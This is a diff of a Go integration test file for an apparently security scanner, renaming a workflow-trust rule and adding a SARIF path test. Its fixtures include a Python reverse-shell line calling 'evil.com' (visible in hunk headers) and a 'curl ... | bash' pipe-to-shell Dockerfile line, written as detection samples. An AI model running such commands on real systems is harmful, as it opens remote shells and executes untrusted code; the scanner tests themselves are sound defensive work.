@@ -92,7 +92,7 @@ webhooks:
 
 	// --- Policy and decoder fixtures ---
 
-	// GitHub Actions with unpinned action (POL-GHA-001) + expression injection
+	// GitHub Actions with unpinned action (SCM-TRUST-001) + expression injection
 	os.MkdirAll(filepath.Join(root, ".github", "workflows"), 0o755)
 	os.WriteFile(filepath.Join(root, ".github", "workflows", "ci.yml"), []byte(`name: CI
 on: push
@@ -226,6 +226,9 @@ python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('evil.com',
 	ruleIDs := make(map[string]struct{})
 	for _, f := range report.Findings {
 		ruleIDs[f.RuleID] = struct{}{}
+		for _, relatedID := range f.RelatedRuleIDs {
+			ruleIDs[relatedID] = struct{}{}
+		}
 	}
 
 	ids := make([]string, 0, len(ruleIDs))
@@ -264,8 +267,8 @@ python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('evil.com',
 	assertHasRuleID("GRAPH-009", "K8s secrets wildcard")
 	assertHasRuleID("GRAPH-010", "webhook failurePolicy Ignore")
 
-	// Policy checks
-	assertHasRulePrefix("POL-", "policy check findings")
+	// Canonical workflow trust check (the duplicate POL-GHA-001 was retired).
+	assertHasRuleID("SCM-TRUST-001", "mutable GitHub Action reference")
 
 	// Pattern rules (pipe-to-shell, credentials)
 	assertHasRulePrefix("SCM-", "supply chain pattern findings")
@@ -291,6 +294,57 @@ python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('evil.com',
 	}
 	if len(report.Findings) < 10 {
 		t.Errorf("expected at least 10 findings, got %d", len(report.Findings))
+	}
+}
+
+func TestIntegrationSARIFSubdirectoryUsesRepositoryRelativeURI(t *testing.T) {
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, ".git"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	scanRoot := filepath.Join(root, "services", "api")
+	if err := os.MkdirAll(scanRoot, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(scanRoot, "Dockerfile"), []byte("RUN curl https://example.test/install.sh | bash\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	binary := buildIntegrationBinary(t)
+	cmd := exec.Command(binary, "scan", "--path", scanRoot, "--format", "sarif", "--fail-on", "none", "--quiet")
+	cmd.Dir = root
+	cmd.Env = isolatedIntegrationEnv(t)
+	output, err := cmd.Output()
+	if err != nil {
+		t.Fatalf("SARIF scan failed: %v", err)
+	}
+	var payload struct {
+		Runs []struct {
+			OriginalURIBaseIDs map[string]any `json:"originalUriBaseIds"`
+			Results            []struct {
+				Locations []struct {
+					PhysicalLocation struct {
+						ArtifactLocation struct {
+							URI       string `json:"uri"`
+							URIBaseID string `json:"uriBaseId"`
+						} `json:"artifactLocation"`
+					} `json:"physicalLocation"`
+				} `json:"locations"`
+			} `json:"results"`
+		} `json:"runs"`
+	}
+	if err := json.Unmarshal(output, &payload); err != nil {
+		t.Fatalf("decode SARIF: %v\n%s", err, output)
+	}
+	if len(payload.Runs) != 1 || len(payload.Runs[0].Results) == 0 {
+		t.Fatalf("missing SARIF run/results: %s", output)
+	}
+	if _, ok := payload.Runs[0].OriginalURIBaseIDs["%SRCROOT%"]; !ok {
+		t.Fatal("missing %SRCROOT% originalUriBaseIds entry")
+	}
+	artifact := payload.Runs[0].Results[0].Locations[0].PhysicalLocation.ArtifactLocation
+	if artifact.URI != "services/api/Dockerfile" || artifact.URIBaseID != "%SRCROOT%" {
+		t.Fatalf("artifact location: uri=%q base=%q", artifact.URI, artifact.URIBaseID)
 	}
 }
 
